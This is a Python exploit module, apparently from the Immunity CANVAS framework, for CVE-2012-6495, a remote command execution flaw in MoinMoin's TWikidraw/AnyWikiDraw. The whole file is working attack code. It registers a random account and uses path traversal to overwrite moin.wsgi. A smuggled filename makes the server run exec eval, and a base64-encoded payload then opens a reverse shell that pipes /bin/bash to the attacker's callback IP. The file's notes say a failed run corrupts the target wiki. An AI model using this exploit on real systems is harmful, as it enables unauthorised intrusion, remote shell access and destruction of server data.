#! /usr/bin/env python
# -*- coding: utf-8 -*-
#utf-8 necessary for the base64 encode
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import time
import socket
import re
import urllib
import urllib2
import cookielib
import random
import canvasengine

#covers both angles
if "." not in sys.path: sys.path.append(".")

import libs.spkproxy as spkproxy
import unixShellNode

from shelllistener import *
from exploitutils import *
from ExploitTypes.php_multi import *
from ExploitTypes.CommandLineExecuter import CommandExploit
from pythonUnixShell import *
from telnetlib import *

NAME                           = "moinmoin_rce"
DESCRIPTION                    = "MoinMoin TWikidraw/AnyWikiDraw Remote Command Execution"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "http://moinmoi.in"
DOCUMENTATION["Repeatability"] = "One-shot"
DOCUMENTATION["CVE Name"]      = "CVE-2012-6495"
DOCUMENTATION["CVE URL"]       = "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-6495"
DOCUMENTATION['CVSS']          = 6

DOCUMENTATION['NOTES']         = """
This version of the exploit forces a callback by overwriting moin.wsgi. This makes it a one-shot exploit, and if
it fails, will result in the remote MoinMoin install being corrupt. Make sure you set your callback IP address
appropriately. Manually refreshing your browser may open up new listener shells even after the exploit has been run.
"""

NOTES                          = """
This version of the exploit forces a callback by overwriting moin.wsgi. This makes it a one-shot exploit, and if
it fails, will result in the remote MoinMoin install being corrupt. Make sure you set your callback IP address
appropriately. Manually refreshing your browser may open up new listener shells even after the exploit has been run.
"""

VERSION                        = "1.0"
PROPERTY                       = {}
PROPERTY['TYPE']               = "Web Exploits"
PROPERTY['SITE']               = "Remote"
PROPERTY['ARCH']               = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION']            = [ "All" ]

CHANGELOG                      = """
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name               = NAME    
        self.autoFind           = False
        self.host               = ""
        self.port               = 80
        self.hostname           = ''
        self.basepath           = "/"
        self.ssl                = False
        self.only_test          = False
        self.discover           = False
        self.vhost              = ''
        self.vulnerable         = []
        self.auth               = None
        
        self.email_acct         = "%s@%s.com" % (self.gen_r_str(20), self.gen_r_str(20)) 
        self.user_acct          = self.gen_r_str(20) #used for logging in
        self.user_pass          = self.gen_r_str(20)
        self.attack_page        = self.gen_r_str(30) #randomize page to attack
        self.attack_plugin      = self.gen_r_str(30)
        self.boundary           = random.randint(10000000000000000, 99999999999999999) 
        self.user_agent         = 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20100101 Firefox/21.0'
        self.success_node       = None

        #cookie handler, will hold onto cookies until we explicitly tell it to drop them
        self.cookies  = cookielib.LWPCookieJar()
        self.handlers = [
                urllib2.HTTPHandler(),
                urllib2.HTTPSHandler(),
                urllib2.HTTPCookieProcessor(self.cookies)
        ]

        self.opener = urllib2.build_opener(*self.handlers)      

    def neededListenerTypes(self):
        return [canvasengine.UNIXSHELL]
        
    def getargs(self):
        """
        Get arguments for attack.
        """
        self.getarg("basepath")
        self.getarg("ssl")
        self.getarg("port")
        self.getarg("only_test")
        self.getarg("discover")
        self.getarg("version")
        self.getarg("vhost")
        
    def python_payload(self):
        payload = """# -*- coding: iso-8859-1 -*-
import sys
import os
import socket
import subprocess

pwd = os.path.dirname(__file__)
sys.path.insert(0, pwd)

def canvas_callback():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM )
        sock.connect(("HOST",PORT))

        fd = sock.makefile()

        proc = subprocess.Popen("/bin/bash", stdin=fd, stdout=fd, stderr=fd)

canvas_callback()

from MoinMoin.web.serving import make_application
application = make_application(shared=True)
"""
        
        payload = payload.replace("HOST", self.callback.ip)
        payload = payload.replace("PORT", str(self.callback.port))
        return payload  

    def test_vuln(self, vhosts):
        if self.ssl:
            protocol="https"
        else:
            protocol="http"

        ret = []
        
        for host in vhosts:
            try:
                url = '%s://%s:%s%s' % (protocol, self.host, self.port, self.basepath)
                response = spkproxy.urlopen(url, hostname=host, exploit=self, verb="GET")
                if re.search("MoinMoin Powered", response.getvalue()): ret.append(host)
            except Exception, ex:
                self.log('Unknown error: %s' % ex)
                
        return ret

    def gen_r_str(self, size=1, chars=string.ascii_letters):
        return ''.join(random.choice(chars) for x in range(size))
    
    def fetch(self, url, info, headers):
        req = urllib2.Request(url)
        return self.opener.open(req)
    
    def create_account(self):
        self.log("Creating attack credentials to attack %s" % (self.hostname))
        
        url        = 'http://%s:%s%s?action=newaccount' % (self.hostname, self.port, self.basepath)
        values     = {
            'action'    :'newaccount',
            'name'      : self.user_acct,
            'password1' : self.user_pass,
            'password2' : self.user_pass,
            'email'     : self.email_acct,
            'create'    :'Create Profile',
        }

        headers  = {'User-Agent' : self.user_agent}
        info     = urllib.urlencode(values)
        req      = urllib2.Request(url, info, headers)
        
        try:
            response = urllib2.urlopen(req)
        except urllib2.HTTPError, e:
            if e.code == 404:
                self.log("Server msg: %s %s. Wiki page might have no content." % (e.code, e.reason))
            else:
                self.log("Server msg: %s %s" % (e.code, e.reason))
        except Exception, ex:
            self.log('Unknown error: %s' % ex)
            
    def login_to_account(self):      
        self.log("Logging in with attack credentials.")
        
        url        = 'http://%s:%s%s?action=login' % (self.hostname, self.port, self.basepath)
        values     = {
            'action'   : 'login',
            'name'     : self.user_acct,
            'password' : self.user_pass,
            'login'    : 'login',
        }
        headers    = {'User-Agent' : self.user_agent}
        info       = urllib.urlencode(values)
        res        = self.fetch(url, info, headers)
        this_page  = res.read()    
        
        
    #doesn't actually do anything, but is required for TWikidraw to kick off    
    #for moinmoin 1.9.5 this extracts the ticket hash
    def open_target(self):
        self.log("Preparing for payload delivery.")
        
        headers = {'User-Agent' : self.user_agent}      
        url     = "http://%s:%s%s%s?action=twikidraw&do=modify&target=../../../../moin.wsgi" % (self.hostname, self.port, self.basepath, self.attack_page)
        info    = ''
        res     = self.fetch(url, info, headers)
        ticket  = res.read()
        m       = re.search('ticket=(.*?)&amp;target', ticket)
        
        try:
            ticket_hash = m.group(1)
            self.log("Extracted ticket hash from MoinMoin: %s" % (ticket_hash))
            return ticket_hash
        except Exception:
            self.log("MoinMoin version 1.9.4 or earlier")

        return None

    #The core of the attack, payload is dropped here
    def deliver_payload(self):
        self.log("Commencing attack on %s without ticket" % (self.hostname))        
        payload  = "exec \"%s\".decode(\"base64\")\n" % self.python_payload().encode("base64").replace("\n","")                 
        
        # tar header is guaranteed to be padded to 512 bytes
        filename = 'drawing.r if()else[]\nexec eval("open(__file__)\\56read()[512:]\\56strip(\'\\\\0\')")'        
        url      = "http://%s:%s%s%s?action=twikidraw&do=save&target=../../../../moin.wsgi" % (self.hostname, self.port, self.basepath, self.attack_page)
    
        exploit_body  = "\r\n--" + str(str(self.boundary)) + "\r\n"
        exploit_body += "Content-Disposition: form-data; name=\"filename\"\r\n\r\n%s" % (filename) + "\r\n"
        exploit_body += "--"+ str(self.boundary) +"\r\n"
        exploit_body += "Content-Disposition: form-data; name=\"filepath\"; filename=\"drawing.png\"\r\n"
        exploit_body += "Content-Type: image/png\r\n\r\n"
        exploit_body += payload + "\r\n"
        exploit_body += "--" + str(self.boundary) + "--"

        headers                 = {}
        headers['Content-Type'] = 'multipart/form-data; boundary=' + str(self.boundary)

        req      = urllib2.Request(url, exploit_body, headers)
        response = urllib2.urlopen(req)
        the_page = response.read()
        
    def deliver_payload_with_ticket(self, ticket):
        self.log("Commencing attack on %s with ticket" % (self.hostname))
        payload  = "exec \"%s\".decode(\"base64\")\n" % self.python_payload().encode("base64").replace("\n","")                 
        
        # tar header is guaranteed to be padded to 512 bytes
        filename = 'drawing.r if()else[]\nexec eval("open(__file__)\\56read()[512:]\\56strip(\'\\\\0\')")'
        
        url      = "http://%s:%s%s%s?action=twikidraw&do=save&ticket=%s&target=../../../../moin.wsgi" % (self.hostname, self.port, self.basepath, self.attack_page, ticket)
        
        exploit_body  = "\r\n--" + str(str(self.boundary)) + "\r\n"
        exploit_body += "Content-Disposition: form-data; name=\"filename\"\r\n\r\n%s" % (filename) + "\r\n"
        exploit_body += "--"+ str(self.boundary) +"\r\n"
        exploit_body += "Content-Disposition: form-data; name=\"filepath\"; filename=\"drawing.png\"\r\n"
        exploit_body += "Content-Type: image/png\r\n\r\n"
        exploit_body += payload + "\r\n"
        exploit_body += "--" + str(self.boundary) + "--"
        headers                 = {}
        headers['Content-Type'] = 'multipart/form-data; boundary=' + str(self.boundary)
        
        req      = urllib2.Request(url, exploit_body, headers)
        response = urllib2.urlopen(req)
        the_page = response.read()  
    

    def open_exploit(self):
        self.log("Finalizing attack.")
        
        headers    = {'User-Agent' : self.user_agent}
        url        = "http://%s:%s%s%s?action=AttachFile" % (self.hostname, self.port, self.basepath, self.attack_page)
        info       = ''
        
        try:
            res = self.fetch(url, info, headers)
        except urllib2.HTTPError, e:
            self.log("HTTPError: %s %s."% (e.code, e.reason))

        
    def run(self):
        self.getargs()
        self.host = self.target.interface

        if not self.vhost:
            self.hostname = self.host
        else:
            self.hostname = self.vhost
            
        vhosts = set([])
        vhosts.add(self.hostname)

        # Check knowledge for vhosts
        vh = self.target.get_knowledge('vhosts')
        if vh: vhosts.update(vh.known)

        # Grab new ones 
        if self.discover:
            self.log('Grabbing vhosts..')
            app = self.engine.getModuleExploit("ip_to_vhosts")
            app.link(self)

            if app.run(): vhosts.update(self.target.get_knowledge('vhosts').known)

        self.vulnerable = self.test_vuln(vhosts)

        if not self.vulnerable:
            self.log("%s doesn't seem to be vulnerable, aborting.." % self.host)
            self.setInfo("%s attacking %s - done (failed)" % (NAME, self.host))
            return 0

        for v in self.vulnerable:
            self.log('%s seems vulnerable!' % v)

        if self.only_test:
            self.setInfo("%s attacking %s - done (success!)" % (NAME, self.host))
            return 1

        self.setInfo("%s attacking %s (in progress)" % (NAME, self.host))
        self.log("%s attacking %s (in progress)" % (NAME, self.host))
        self.log('Port: %s' % self.port)
        self.log('SSL: %s' % self.ssl)
        self.log('Vhost: %s' % self.vhost)
        self.log('Basepath: %s' % self.basepath)
        
        self.create_account()
        self.login_to_account()
        ticket = self.open_target()
        
        if ticket is not None:
            self.deliver_payload_with_ticket(ticket)
        else: 
            self.deliver_payload()
            
        self.open_exploit()
        if self.ISucceeded(): return 1
        
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
